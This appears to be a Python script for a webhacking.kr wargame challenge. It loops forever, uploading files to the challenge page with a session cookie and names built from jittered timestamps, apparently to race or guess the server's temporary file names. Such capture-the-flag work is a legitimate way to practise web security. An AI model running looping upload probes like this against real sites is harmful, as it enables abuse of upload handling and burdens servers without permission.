from random import random
import aiohttp
import asyncio
import math
import time
import random

URL = "https://webhacking.kr/challenge/web-18/"
SESSION_ID = "1"

async def upload_file(session):
    file_name = 'tmp-' + str(math.trunc(time.time()+random.randint(-2,2)))
    data = aiohttp.FormData()
    data.add_field('upfile', 'Hello world', filename=file_name)

    headers = {'Cookie': f'PHPSESSID={SESSION_ID}'}
    
    async with session.post(URL, data=data, headers=headers) as response:
        if response.status == 200:
            print(f"File {file_name} uploaded successfully.")
        else:
            print(f"Failed to upload file {file_name}. Status code: {response.status}")

async def main():
    async with aiohttp.ClientSession() as session:
        while True:
            await upload_file(session)
            await asyncio.sleep(1)  # optional delay between requests

# Run the async loop
asyncio.run(main())
